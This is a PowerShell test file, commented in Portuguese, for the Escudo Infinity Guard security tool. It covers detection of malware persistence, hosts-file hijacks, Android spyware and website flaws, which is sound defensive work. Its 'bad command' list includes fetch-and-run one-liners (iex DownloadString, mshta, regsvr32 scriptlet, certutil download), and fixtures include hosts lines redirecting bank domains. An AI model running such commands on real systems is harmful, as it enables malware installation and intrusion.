﻿<#
  Testes do Escudo Infinity Guard (PC, Android e site).
  Rodam em qualquer PowerShell (5.1 no Windows ou 7 no Windows/Linux/Mac), sem mexer no PC:
  usam fotos de estado salvas em testes\fixtures.

    powershell -ExecutionPolicy Bypass -File testes\Testar-Escudo.ps1

  Opcional: -UrlLocal http://127.0.0.1:8099 testa a checagem de arquivos expostos num servidor de laboratório.
#>
param([string]$UrlLocal)

$ErrorActionPreference = 'Stop'
$raiz = Split-Path -Parent $PSScriptRoot
Import-Module (Join-Path (Join-Path $raiz 'modulo') 'EscudoInfinityGuard.psm1') -Force -DisableNameChecking
$mod = Get-Module EscudoInfinityGuard
$fx = Join-Path $PSScriptRoot 'fixtures'

$script:ok = 0
$script:falhas = @()
function Confere([string]$Nome, [bool]$Cond) {
    if ($Cond) { $script:ok++ } else { $script:falhas += $Nome }
}
function Ler([string]$Arq) { [System.IO.File]::ReadAllText((Join-Path $fx $Arq), [System.Text.Encoding]::UTF8) | ConvertFrom-Json }
function Tem($Achados, [string]$Id) { return [bool](@($Achados | Where-Object { $_.Id -eq $Id }).Count) }
function TemPrefixo($Achados, [string]$Prefixo) { return [bool](@($Achados | Where-Object { $_.Id -like "$Prefixo*" }).Count) }

$cfg = & $mod { Get-EscudoConfig }

# --- 1. Caminhos e comandos suspeitos ---------------------------------------
$suspeitos = @(
    'C:\Users\maxim\AppData\Local\Temp\svc.exe',
    'C:\Users\Public\upd.exe',
    'C:\Users\maxim\Downloads\crack.exe',
    'C:\Users\maxim\AppData\Roaming\winlogon.exe',
    'C:\ProgramData\svch.exe',
    'C:\Windows\Temp\a.bat',
    'D:\foto.scr'
)
foreach ($c in $suspeitos) { Confere "caminho suspeito: $c" (Test-EscudoCaminhoSuspeito $c) }
$normais = @(
    'C:\Program Files\Google\Chrome\Application\chrome.exe',
    'C:\Windows\System32\SecurityHealthSystray.exe',
    'C:\Users\maxim\AppData\Local\Microsoft\OneDrive\OneDrive.exe',
    'C:\Users\maxim\AppData\Local\Discord\Update.exe',
    'C:\Users\maxim\AppData\Roaming\Spotify\Spotify.exe',
    'C:\ProgramData\Microsoft\Windows Defender\platform\4.18\MsMpEng.exe'
)
foreach ($c in $normais) { Confere "caminho normal: $c" (-not (Test-EscudoCaminhoSuspeito $c)) }

$cmdsRuins = @(
    'powershell.exe -nop -w hidden -enc SQBFAFgA',
    'powershell -WindowStyle Hidden -c "iex (New-Object Net.WebClient).DownloadString(''http://x'')"',
    'mshta.exe http://203.0.113.9/a.hta',
    'regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll',
    'certutil -urlcache -split -f http://x/a.exe a.exe',
    'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"'
)
foreach ($c in $cmdsRuins) { Confere "comando ruim: $c" ([bool](Get-EscudoMotivoComando $c)) }
$cmdsBons = @(
    '"C:\Program Files\Google\Chrome\Application\chrome.exe" --no-startup-window',
    'C:\Windows\system32\SecurityHealthSystray.exe',
    '"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c',
    'powershell.exe -NoProfile -File "C:\Program Files\EscudoInfinityGuard\Escudo.ps1" -Acao Vigiar'
)
foreach ($c in $cmdsBons) { Confere "comando bom: $c" (-not (Get-EscudoMotivoComando $c)) }

Confere 'extrai caminho com aspas' ((Get-EscudoCaminhoDoComando '"C:\Program Files\A\a.exe" /x') -eq 'C:\Program Files\A\a.exe')
Confere 'extrai caminho sem aspas' ((Get-EscudoCaminhoDoComando 'C:\Windows\system32\userinit.exe,') -eq 'C:\Windows\system32\userinit.exe')
Confere 'extrai caminho com argumento' ((Get-EscudoCaminhoDoComando 'C:\Users\x\AppData\Local\Discord\Update.exe --processStart Discord.exe') -eq 'C:\Users\x\AppData\Local\Discord\Update.exe')

function exc($v, $t) { Test-EscudoExclusaoPerigosa -Valor $v -Tipo $t }
Confere 'exclusão do disco inteiro é perigosa' (exc 'C:\' 'Caminho')
Confere 'exclusão de AppData é perigosa' (exc 'C:\Users\x\AppData\Roaming\svc' 'Caminho')
Confere 'exclusão .exe é perigosa' (exc '.exe' 'Extensao')
Confere 'exclusão powershell.exe é perigosa' (exc 'powershell.exe' 'Processo')
Confere 'exclusão de pasta de projeto é normal' (-not (exc 'D:\Projetos\jogo' 'Caminho'))
Confere 'exclusão .vhdx é normal' (-not (exc 'vhdx' 'Extensao'))

Confere 'vacina do Defender não conta como atualização do Windows' (-not (Test-EscudoAtualizacaoDoWindows 'Atualização de Inteligência de Segurança para Microsoft Defender Antivírus - KB2267602 (Versão 1.419.2)'))
Confere 'vacina em inglês também não conta' (-not (Test-EscudoAtualizacaoDoWindows 'Security Intelligence Update for Microsoft Defender Antivirus - KB2267602'))
Confere 'atualização cumulativa conta' (Test-EscudoAtualizacaoDoWindows '2026-10 Atualização Cumulativa para Windows 11 Version 24H2 para sistemas baseados em x64 (KB5066835)')
Confere 'atualização de .NET conta' (Test-EscudoAtualizacaoDoWindows '2026-10 Cumulative Update for .NET Framework 3.5 and 4.8.1 for Windows 11 (KB5066131)')

# --- 2. PC saudável -----------------------------------------------------------
$saudavel = Ler 'pc-saudavel.json'
$a1 = @(Get-EscudoAchados -Estado $saudavel -Config $cfg)
$graves1 = @($a1 | Where-Object { $_.Nivel -in 'Critico', 'Alto', 'Medio' })
Confere "PC saudável sem problemas (achou: $(($graves1 | ForEach-Object Id) -join ', '))" ($graves1.Count -eq 0)
Confere 'PC saudável mostra vírus barrado como info' (Tem $a1 'ameaca-Trojan:Win32/Wacatac.B!ml')
Confere 'PC saudável nota 100' ((Get-EscudoNota $a1) -eq 100)

# --- 3. PC invadido -----------------------------------------------------------
$ruim = Ler 'pc-vulneravel.json'
$a2 = @(Get-EscudoAchados -Estado $ruim -Config $cfg)
$esperados = @('def-tempo-real', 'def-comportamento', 'def-adulteracao', 'def-vacinas', 'def-varredura-rapida', 'def-varredura-completa',
    'def-nuvem', 'def-pua', 'def-rede', 'def-ransomware', 'def-asr', 'def-exclusao-perigosa',
    'fw-Public', 'fw-entrada-Private', 'win-update', 'win-reinicio', 'win-uac', 'win-smb1', 'win-rdp', 'win-secureboot',
    'win-bitlocker', 'win-convidado', 'win-admins', 'hosts-sequestro', 'hosts-bloqueia-update',
    'ameaca-Trojan:Win32/Grandoreiro', 'winlogon-shell', 'winlogon-userinit')
foreach ($id in $esperados) { Confere "PC invadido deveria acusar $id" (Tem $a2 $id) }
Confere 'acusa item de inicialização com PowerShell escondido' (Tem $a2 'inicio-WindowsUpdater')
Confere 'acusa atalho de inicialização em Temp' (Tem $a2 'inicio-svc.lnk')
Confere 'acusa tarefa com mshta' (Tem $a2 'tarefa-\GoogleUpdateTaskCore')
Confere 'acusa tarefa disfarçada de Microsoft' (Tem $a2 'tarefa-\Microsoft\Windows\Sync')
Confere 'acusa processo rodando de Public' (Tem $a2 'processo-6612')
Confere 'tempo real aparece só uma vez' (@($a2 | Where-Object Id -eq 'def-tempo-real').Count -eq 1)
Confere 'ordem: crítico primeiro' ($a2[0].Nivel -eq 'Critico')
Confere 'nota do PC invadido é 0' ((Get-EscudoNota $a2) -eq 0)
$vacina = @($a2 | Where-Object Id -eq 'def-varredura-completa')[0]
Confere 'varredura completa "nunca"' ($vacina.Titulo -like 'Nunca*')
$hostsSeq = @($a2 | Where-Object Id -eq 'hosts-sequestro')[0]
Confere 'hosts mostra banco desviado' ($hostsSeq.Detalhe -match 'bb\.com\.br' -and $hostsSeq.Detalhe -match 'nubank')

# --- 4. Estado incompleto (rodou sem administrador) não pode quebrar ----------
$parcial = [pscustomobject]@{ Computador = 'X'; Defender = $null; Preferencias = $null; Firewall = @() }
$a3 = @(Get-EscudoAchados -Estado $parcial -Config $cfg)
Confere 'estado parcial avisa que não leu o antivírus' (Tem $a3 'def-ilegivel')
$a4 = @(Get-EscudoAchados -Estado ([pscustomobject]@{}) -Config $null)
Confere 'estado vazio não quebra' ($a4.Count -ge 1)

# --- 5. Linha de base (vigia) -------------------------------------------------
$foto1 = @(& $mod { param($e) Get-EscudoFotografia $e } $saudavel)
$saudavel2 = Ler 'pc-saudavel.json'
$saudavel2.Inicializacao += [pscustomobject]@{ Origem = 'HKCU:\Run'; Nome = 'NovoApp'; Comando = 'C:\Program Files\NovoApp\app.exe'; Assinado = $true }
$saudavel2.Administradores += 'DESKTOP-LQTM4AD\hacker'
$foto2 = @(& $mod { param($e) Get-EscudoFotografia $e } $saudavel2)
$novos = @(& $mod { param($a, $b) Compare-EscudoLinhaDeBase -Antes $a -Agora $b } $foto1 $foto2)
Confere "vigia acha 2 novidades ($($novos.Count))" ($novos.Count -eq 2)
Confere 'vigia acha administrador novo' ([bool]@($novos | Where-Object { $_.Tipo -eq 'administrador' -and $_.Nome -like '*hacker' }).Count)
$fotoJson = @((ConvertTo-Json -InputObject $foto1 -Depth 4) | ConvertFrom-Json)
$semMudanca = @(& $mod { param($a, $b) Compare-EscudoLinhaDeBase -Antes $a -Agora $b } $fotoJson $foto1)
Confere 'vigia sem mudança (depois de salvar e ler JSON) não acusa nada' ($semMudanca.Count -eq 0)
$saudavel2 | Add-Member -NotePropertyName Novidades -NotePropertyValue $novos -Force
$a5 = @(Get-EscudoAchados -Estado $saudavel2 -Config $cfg)
Confere 'novidade vira alerta da vigia' (@($a5 | Where-Object Area -eq 'Vigia').Count -eq 2)

# --- 6. Plano de reforço ------------------------------------------------------
$plano = @(& $mod { param($e, $c) Get-EscudoPlanoDeReforco -Estado $e -Config $c } $ruim $cfg)
foreach ($id in @('tempo-real', 'nuvem', 'pua', 'rede', 'pastas', 'asr', 'firewall', 'smb1', 'vacinas')) {
    Confere "plano de reforço inclui $id" ([bool]@($plano | Where-Object Id -eq $id).Count)
}
$planoParcial = @(& $mod { param($e, $c) Get-EscudoPlanoDeReforco -Estado $e -Config $c } ([pscustomobject]@{ Computador = 'X' }) $cfg)
Confere 'plano de reforço funciona sem leitura do Defender' ([bool]@($planoParcial | Where-Object Id -eq 'tudo-defender').Count)
$fotoJsonTexto = ConvertTo-Json -InputObject $foto1 -Depth 4
$relida = @($fotoJsonTexto | ConvertFrom-Json | ForEach-Object { $_ })
Confere "linha de base relida do JSON tem $($foto1.Count) itens ($($relida.Count))" ($relida.Count -eq $foto1.Count)
$planoBom = @(& $mod { param($e, $c) Get-EscudoPlanoDeReforco -Estado $e -Config $c } $saudavel $cfg)
Confere 'PC saudável: plano só reaplica ASR e atualiza vacinas' ((($planoBom | ForEach-Object Id) -join ',') -eq 'asr,vacinas')

# --- 7. Relatório HTML --------------------------------------------------------
$html = & $mod { param($a) ConvertTo-EscudoHtml -Titulo 'Teste <script>' -Nota 37 -Achados $a -Resumo @('linha & 1') } $a2
Confere 'HTML escapa texto perigoso' ($html -notmatch '<script>' -and $html -match '&lt;script&gt;')
Confere 'HTML tem a nota' ($html -match '<b>37</b>')
Confere 'HTML tem um bloco por achado' (([regex]::Matches($html, 'class="item ')).Count -eq $a2.Count)
Confere 'HTML tem modo escuro' ($html -match 'prefers-color-scheme:dark')
$htmlVazio = & $mod { ConvertTo-EscudoHtml -Titulo 'x' -Nota 100 -Achados @() }
Confere 'HTML sem achados diz que está tudo certo' ($htmlVazio -match 'Nenhum problema encontrado')

# --- 8. Android ---------------------------------------------------------------
$and = Ler 'android-golpe.json'
$pac = @(& $mod { param($l) ConvertFrom-EscudoAdbPacotes $l } $and.pacotes)
Confere 'lê 5 pacotes' ($pac.Count -eq 5)
Confere 'installer=null vira vazio' ($null -eq @($pac | Where-Object Pacote -eq 'com.lanterna.top')[0].Instalador)
$acs = @(& $mod { param($t) ConvertFrom-EscudoAdbServicos $t } $and.acessibilidade)
Confere 'lê serviços de acessibilidade' ($acs.Count -eq 2 -and $acs -contains 'com.atualizacao.seguranca')
Confere 'acessibilidade "null" vira lista vazia' (@(& $mod { ConvertFrom-EscudoAdbServicos 'null' }).Count -eq 0)
$adm = @(& $mod { param($l) ConvertFrom-EscudoAdbAdmins $l } $and.device_policy)
Confere 'lê administradores do aparelho' ($adm.Count -eq 2 -and $adm -contains 'com.atualizacao.seguranca')
$dadosAnd = [pscustomobject]@{
    Modelo = 'Teste'; Versao = $and.versao; Patch = $and.patch; Pacotes = $pac; Acessibilidade = $acs
    Notificacoes = @(& $mod { param($t) ConvertFrom-EscudoAdbServicos $t } $and.notificacoes); Admins = $adm
    PodemInstalar = @($and.podem_instalar); PlayProtect = $and.play_protect; Root = $and.root; TelaSemBloqueio = $and.sem_bloqueio; DevAtivo = $and.dev
}
$aa = @(Get-EscudoAndroidAchados -Dados $dadosAnd -LojasConfiaveis $cfg.lojas_android_confiaveis -Hoje ([datetime]'2026-10-24'))
foreach ($id in @('and-patch', 'and-versao', 'and-playprotect', 'and-bloqueio', 'and-acess-com.atualizacao.seguranca', 'and-admin-com.atualizacao.seguranca', 'and-notif-com.atualizacao.seguranca', 'and-instala-com.android.chrome', 'and-instala-com.whatsapp', 'and-fora-da-loja', 'and-dev')) {
    Confere "Android deveria acusar $id" (Tem $aa $id)
}
Confere 'app espião com acessibilidade é CRÍTICO' (@($aa | Where-Object Id -eq 'and-acess-com.atualizacao.seguranca')[0].Nivel -eq 'Critico')
Confere 'TalkBack do Google não é acusado' (-not (Tem $aa 'and-acess-com.google.android.marvin.talkback'))
Confere 'admin do Google (Encontre meu dispositivo) não é acusado' (-not (TemPrefixo $aa 'and-admin-com.google'))
Confere 'WhatsApp da Play Store lendo notificação não é acusado' (-not (Tem $aa 'and-notif-com.whatsapp'))
$fora = @($aa | Where-Object Id -eq 'and-fora-da-loja')[0]
Confere 'lista os 2 apps de fora da loja' ($fora.Titulo -like '2 app*')
$celBom = [pscustomobject]@{ Versao = '15'; Patch = '2026-10-01'; Pacotes = @([pscustomobject]@{ Pacote = 'com.whatsapp'; Instalador = 'com.android.vending' }); Acessibilidade = @(); Notificacoes = @(); Admins = @('com.google.android.gms'); PodemInstalar = @(); PlayProtect = '1'; Root = $false; TelaSemBloqueio = $false; DevAtivo = '0' }
$ab = @(Get-EscudoAndroidAchados -Dados $celBom -LojasConfiaveis $cfg.lojas_android_confiaveis -Hoje ([datetime]'2026-10-24'))
Confere "celular bem cuidado sem alertas (achou: $(($ab | ForEach-Object Id) -join ','))" ($ab.Count -eq 0)

# --- 9. Site -----------------------------------------------------------------
Confere 'PHP 7.4 sem suporte' ((& $mod { Get-EscudoPhpStatus -Versao '7.4.33' }) -eq 'sem-suporte')
Confere 'PHP 8.1 sem suporte' ((& $mod { Get-EscudoPhpStatus -Versao '8.1.2' }) -eq 'sem-suporte')
Confere 'PHP 8.2 fim próximo' ((& $mod { Get-EscudoPhpStatus -Versao '8.2.24' }) -eq 'fim-proximo')
Confere 'PHP 8.4 suportado' ((& $mod { Get-EscudoPhpStatus -Versao '8.4.1' }) -eq 'suportada')

$siteRuim = [pscustomobject]@{
    Url = 'https://cliente.example'; Https = $true; CertErro = $null; CertDias = 9; RedirecionaHttps = $false
    Cabecalhos = @{ 'server' = 'Apache/2.4.29 (Ubuntu)'; 'x-powered-by' = 'PHP/7.4.3' }
    Cookies = @('PHPSESSID=abc; path=/')
    Html = '<html><head><meta name="generator" content="WordPress 5.8.1"><script src="http://cdn.example/x.js"></script></head><body><script>eval(function(p,a,c,k,e,d){})</script></body></html>'
    Expostos = @('/.env', '/.git/HEAD'); Plataforma = $null
}
$as = @(Get-EscudoSiteAchados -Coleta $siteRuim -PhpMinimo $cfg.php_minimo_suportado -PhpFimProximo $cfg.php_fim_de_suporte_proximo)
foreach ($id in @('site-cert-vencendo', 'site-redireciona', 'site-php-velho', 'site-php-exposto', 'site-server-versao', 'site-hsts', 'site-frame', 'site-nosniff', 'site-csp', 'site-cookie-PHPSESSID', 'site-generator', 'site-misto', 'site-injecao', 'site-exposto-/.env', 'site-exposto-/.git/HEAD')) {
    Confere "site ruim deveria acusar $id" (Tem $as $id)
}
$cookie = @($as | Where-Object Id -eq 'site-cookie-PHPSESSID')[0]
Confere 'cookie de sessão sem Secure e HttpOnly' ($cookie.Titulo -match 'Secure' -and $cookie.Titulo -match 'HttpOnly')

$siteBom = [pscustomobject]@{
    Url = 'https://bom.example'; Https = $true; CertErro = $null; CertDias = 80; RedirecionaHttps = $true
    Cabecalhos = @{ 'server' = 'nginx'; 'strict-transport-security' = 'max-age=31536000'; 'content-security-policy' = "default-src 'self'; frame-ancestors 'self'"; 'x-content-type-options' = 'nosniff' }
    Cookies = @('sessao=1; Path=/; Secure; HttpOnly; SameSite=Lax'); Html = '<html><body>Olá</body></html>'; Expostos = @(); Plataforma = $null
}
$asb = @(Get-EscudoSiteAchados -Coleta $siteBom)
Confere "site bem configurado sem alertas (achou: $(($asb | ForEach-Object Id) -join ','))" ($asb.Count -eq 0)
$siteNuvem = [pscustomobject]@{ Url = 'https://loja.example'; Https = $true; CertDias = 60; RedirecionaHttps = $true; Cabecalhos = @{ 'strict-transport-security' = 'max-age=1'; 'x-frame-options' = 'SAMEORIGIN'; 'x-content-type-options' = 'nosniff' }; Cookies = @(); Html = ''; Expostos = @(); Plataforma = 'Nuvemshop' }
$asn = @(Get-EscudoSiteAchados -Coleta $siteNuvem)
Confere 'loja em plataforma explica quem cuida do servidor' (Tem $asn 'site-plataforma')
Confere 'loja em plataforma: CSP indica a plataforma' ((@($asn | Where-Object Id -eq 'site-csp')[0].OQueFazer) -match 'Nuvemshop')
$semHttps = [pscustomobject]@{ Url = 'http://x.example'; Https = $false; CertErro = 'Não abriu em HTTPS'; Cabecalhos = @{}; Cookies = @(); Html = ''; Expostos = @() }
$ash = @(Get-EscudoSiteAchados -Coleta $semHttps)
Confere 'site sem HTTPS é crítico' ((Tem $ash 'site-https') -and (Tem $ash 'site-cert-invalido'))

function permitido($u, $c, $d) { Test-EscudoSitePermitido -Url $u -Config $c -EuSouDono:$d }
Confere 'site da Infinity Guard é permitido' (permitido 'https://infinityguard.com.br/produtos' $cfg $false)
Confere 'site de terceiro é recusado' (-not (permitido 'https://banco.example' $cfg $false))
Confere 'site de terceiro com -EuSouDono é permitido' (permitido 'https://banco.example' $cfg $true)

$fora = [pscustomobject]@{ Url = 'https://fora.example'; Inalcancavel = $true; Https = $false; CertErro = 'proxy 403'; Cabecalhos = @{}; Expostos = @() }
$asf = @(Get-EscudoSiteAchados -Coleta $fora)
Confere 'site fora do ar: só 1 aviso, sem acusar falha de segurança' ($asf.Count -eq 1 -and $asf[0].Id -eq 'site-inalcancavel')
$soHttp = [pscustomobject]@{ Url = 'http://velho.example'; Https = $false; CertErro = 'recusou'; RedirecionaHttps = $false; Cabecalhos = @{}; Expostos = @('/.env') }
$aso = @(Get-EscudoSiteAchados -Coleta $soHttp)
Confere 'site só http: acusa https e .env, sem palpite de cabeçalho' ((Tem $aso 'site-https') -and (Tem $aso 'site-exposto-/.env') -and -not (Tem $aso 'site-frame'))

# --- 11. Varrer e corrigir (com simulação do Windows) -------------------------
$hl = Get-EscudoHostsLimpo -Linhas @('127.0.0.1 localhost', '185.12.33.4 www.bb.com.br bb.com.br', '0.0.0.0 ads.exemplo', '203.0.113.9 nubank.com.br # banco') -Nomes @('www.bb.com.br', 'nubank.com.br')
Confere 'hosts: mantém localhost' ($hl -contains '127.0.0.1 localhost')
Confere 'hosts: desativa a linha do banco falso' ($hl -contains '# [Escudo desativou] 185.12.33.4 www.bb.com.br bb.com.br')
Confere 'hosts: mantém o outro nome da mesma linha' ($hl -contains '185.12.33.4 bb.com.br')
Confere 'hosts: desativa nubank' (@($hl | Where-Object { $_ -match '^203' }).Count -eq 0)
Confere 'hosts: não mexe em bloqueio de propaganda' ($hl -contains '0.0.0.0 ads.exemplo')

$vul = Ler 'pc-vulneravel.json'
$avul = @(Get-EscudoAchados -Estado $vul -Config $cfg)
$plano = @(Get-EscudoPlanoDeCorrecao -Achados $avul)
$tipos = @($plano | ForEach-Object Tipo)
foreach ($t in @('remover-ameacas', 'desativar-inicio', 'desativar-tarefa', 'restaurar-winlogon', 'limpar-hosts', 'reforco', 'processo')) { Confere "plano corrige: $t" ($tipos -contains $t) }
Confere 'plano: reforço aparece 1 vez só' (@($tipos | Where-Object { $_ -eq 'reforco' }).Count -eq 1)
Confere 'plano: começa cortando o vírus' ($plano[0].Tipo -in @('processo', 'remover-ameacas'))
Confere 'plano: Windows Update fica por último' ($tipos.IndexOf('atualizar-windows') -in @(-1, ($tipos.Count - 1)))
Confere 'plano: proteção contra adulteração não entra (só a pessoa liga)' (-not ($plano | Where-Object { $_.Achado -eq 'def-adulteracao' }))
$sau = Ler 'pc-saudavel.json'
Confere 'PC saudável: nada para corrigir além de rotina' (@(Get-EscudoPlanoDeCorrecao -Achados @(Get-EscudoAchados -Estado $sau -Config $cfg) | Where-Object { $_.Tipo -notin @('varredura', 'instalar-vigia', 'atualizar-windows') }).Count -eq 0)
$semRdp = $cfg.PSObject.Copy(); $semRdp | Add-Member -NotePropertyName corrigir_rdp -NotePropertyValue $false -Force
$vulRdp = $vul.PSObject.Copy(); $vulRdp.RDPLigado = $true
Confere 'RDP: corrige por padrão' ([bool](@(Get-EscudoAchados -Estado $vulRdp -Config $cfg | Where-Object { $_.Id -eq 'win-rdp' -and $_.Correcao }).Count))
Confere 'RDP: respeita corrigir_rdp=false' (-not [bool](@(Get-EscudoAchados -Estado $vulRdp -Config $semRdp | Where-Object { $_.Id -eq 'win-rdp' -and $_.Correcao }).Count))

# Windows de mentira: registra tudo que o Escudo "faria"
$tmp = Join-Path ([System.IO.Path]::GetTempPath()) ("escudo-teste-" + [guid]::NewGuid().ToString('n'))
New-Item -ItemType Directory -Path (Join-Path $tmp 'backup') -Force | Out-Null
$script:F = @{ Hosts = @($vul.HostsLinhas); Reg = @{}; Arquivos = @{}; Tarefas = @{}; Feito = New-Object System.Collections.ArrayList; Exclusoes = @{ 'C:\Users\maxim\AppData\Local\Temp|Caminho' = 1 }; Convidado = $true }
$script:F.Reg['HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|WindowsUpdater'] = 'powershell.exe -nop -w hidden -enc SQBFAFgA'
$script:F.Reg['HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon|Shell'] = 'explorer.exe, C:\Users\Public\x.exe'
$script:F.Reg['HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon|Userinit'] = 'C:\Windows\system32\userinit.exe,C:\ProgramData\svch.exe,'
$script:F.Arquivos['C:\Users\maxim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svc.lnk'] = 1
$script:F.Arquivos['C:\Users\Public\upd.exe'] = 1
$script:F.Arquivos['C:\ProgramData\svch.exe'] = 1
$ops = @{
    RemoverExclusao   = { param($V, $T) $script:F.Exclusoes.Remove("$V|$T"); [void]$script:F.Feito.Add("excl-:$V") }
    AdicionarExclusao = { param($V, $T) $script:F.Exclusoes["$V|$T"] = 1 }
    LerHosts          = { $script:F.Hosts }
    GravarHosts       = { param([string[]]$L) $script:F.Hosts = @($L) }
    LerValor          = { param($C, $N) $script:F.Reg["$C|$N"] }
    GravarValor       = { param($C, $N, $V, $T) $script:F.Reg["$C|$N"] = $V }
    RemoverValor      = { param($C, $N) if (-not $script:F.Reg.ContainsKey("$C|$N")) { throw 'não existe' }; $script:F.Reg.Remove("$C|$N") }
    MoverArquivo      = { param($De, $Para) if (-not $script:F.Arquivos.ContainsKey($De)) { throw "sem $De" }; $script:F.Arquivos.Remove($De); $script:F.Arquivos[$Para] = 1 }
    ExisteArquivo     = { param($C) [bool]($C -and $script:F.Arquivos.ContainsKey($C)) }
    DesativarTarefa   = { param($N) $script:F.Tarefas[$N] = 'off' }
    AtivarTarefa      = { param($N) $script:F.Tarefas[$N] = 'on' }
    EncerrarProcesso  = { param($P) [void]$script:F.Feito.Add("kill:$P") }
    VarrerArquivo     = { param($C) [void]$script:F.Feito.Add("scan:$C") }
    RemoverAmeacas    = { [void]$script:F.Feito.Add('remove-threat') }
    AtualizarVacinas  = { [void]$script:F.Feito.Add('vacinas') }
    VarreduraRapida   = { [void]$script:F.Feito.Add('quick') }
    Convidado         = { param([bool]$L) $script:F.Convidado = $L }
    AtualizarWindows  = { [void]$script:F.Feito.Add('wu') }
    Reforcar          = { [void]$script:F.Feito.Add('reforco') }
    InstalarVigia     = { [void]$script:F.Feito.Add('vigia'); 'instalada' }
    VigiaInstalada    = { $false }
}
$planoTeste = @($plano) + @([pscustomobject]@{ Tipo = 'remover-exclusao'; Texto = 'x'; Dados = @{ Tipo = 'remover-exclusao'; Itens = @(@{ V = 'C:\Users\maxim\AppData\Local\Temp'; T = 'Caminho' }) } },
    [pscustomobject]@{ Tipo = 'ligar-uac'; Texto = 'uac'; Dados = @{ Tipo = 'ligar-uac' } },
    [pscustomobject]@{ Tipo = 'desligar-convidado'; Texto = 'conv'; Dados = @{ Tipo = 'desligar-convidado' } })
$rc = Invoke-EscudoCorrecoes -Plano $planoTeste -Ops $ops -PastaDados $tmp
$falhou = @($rc.Resultados | Where-Object { -not $_.Ok })
Confere "correções: nenhuma falhou ($(($falhou | ForEach-Object { "$($_.Tipo): $($_.Erro)" }) -join '; '))" ($falhou.Count -eq 0)
Confere 'corrige: tira o PowerShell escondido do Run' (-not $script:F.Reg.ContainsKey('HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|WindowsUpdater'))
Confere 'corrige: atalho da pasta Inicializar vai para a quarentena' (-not $script:F.Arquivos.ContainsKey('C:\Users\maxim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svc.lnk') -and @($script:F.Arquivos.Keys | Where-Object { $_ -like '*quarentena*svc.lnk' }).Count -eq 1)
Confere 'corrige: tarefas suspeitas desativadas' ($script:F.Tarefas['\GoogleUpdateTaskCore'] -eq 'off' -and $script:F.Tarefas['\Microsoft\Windows\Sync'] -eq 'off')
Confere 'corrige: Shell volta a explorer.exe' ($script:F.Reg['HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon|Shell'] -eq 'explorer.exe')
Confere 'corrige: Userinit volta ao original' ($script:F.Reg['HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon|Userinit'] -eq 'C:\Windows\system32\userinit.exe,')
Confere 'corrige: antivírus examina o programa pendurado no login' ($script:F.Feito -contains 'scan:C:\ProgramData\svch.exe')
Confere 'corrige: hosts sem o banco falso' (-not ($script:F.Hosts | Where-Object { $_ -match '^185\.12' }))
Confere 'corrige: hosts libera atualização do antivírus' (-not ($script:F.Hosts | Where-Object { $_ -match '^0\.0\.0\.0 definitionupdates' }))
Confere 'corrige: manda remover vírus pendente' ($script:F.Feito -contains 'remove-threat')
Confere 'corrige: examina o programa suspeito rodando' ($script:F.Feito -contains 'scan:C:\Users\Public\upd.exe')
Confere 'corrige: não mata processo só por estar em pasta pública (sinal fraco)' (-not ($script:F.Feito | Where-Object { $_ -like 'kill:*' }))
Confere 'corrige: reforço e varredura rodam' ($script:F.Feito -contains 'reforco' -and $script:F.Feito -contains 'quick')
Confere 'corrige: exclusão perigosa removida' ($script:F.Exclusoes.Count -eq 0)
Confere 'corrige: UAC religado' ($script:F.Reg['HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System|EnableLUA'] -eq 1)
Confere 'corrige: convidado desativado' ($script:F.Convidado -eq $false)
Confere 'corrige: grava cópia do hosts' (@(Get-ChildItem (Join-Path $tmp 'backup') -Filter 'hosts-*.txt').Count -ge 1)
Confere 'corrige: grava arquivo para desfazer' ($rc.Desfazer -and (Test-Path $rc.Desfazer))
$forte = @([pscustomobject]@{ Tipo = 'processo'; Texto = 'p'; Dados = @{ Tipo = 'processo'; Pid = 4242; Arquivo = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'; Encerrar = $true } })
[void](Invoke-EscudoCorrecoes -Plano $forte -Ops $ops -PastaDados $tmp)
Confere 'processo com comando de vírus: encerra' ($script:F.Feito -contains 'kill:4242')
Confere 'processo: nunca move programa do sistema' (-not ($script:F.Arquivos.Keys | Where-Object { $_ -like '*powershell.exe' }))

$n = Undo-EscudoCorrecoes -Arquivo $rc.Desfazer -Ops $ops -PastaDados $tmp
Confere "desfazer: voltou $n item(ns)" ($n -ge 10)
Confere 'desfazer: Run volta' ($script:F.Reg['HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|WindowsUpdater'] -like 'powershell*')
Confere 'desfazer: atalho volta da quarentena' ($script:F.Arquivos.ContainsKey('C:\Users\maxim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svc.lnk'))
Confere 'desfazer: hosts volta igual' ((@($script:F.Hosts) -join "`n") -eq (@($vul.HostsLinhas) -join "`n"))
Confere 'desfazer: tarefas voltam' ($script:F.Tarefas['\GoogleUpdateTaskCore'] -eq 'on')
Confere 'desfazer: Shell volta' ($script:F.Reg['HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon|Shell'] -like 'explorer.exe, *')
Confere 'desfazer: UAC volta (não existia: some)' (-not $script:F.Reg.ContainsKey('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System|EnableLUA'))
Confere 'desfazer: exclusões voltam' ($script:F.Exclusoes.ContainsKey('C:\Users\maxim\AppData\Local\Temp|Caminho') -and $script:F.Exclusoes.ContainsKey('powershell.exe|Processo'))
Confere 'desfazer: convidado volta' ($script:F.Convidado -eq $true)
Confere 'desfazer: marca o registro como desfeito' (-not (Test-Path $rc.Desfazer))

$opsQuebra = $ops.Clone(); $opsQuebra.RemoverAmeacas = { throw 'Defender ocupado' }
$rq = Invoke-EscudoCorrecoes -Plano $plano -Ops $opsQuebra -PastaDados $tmp
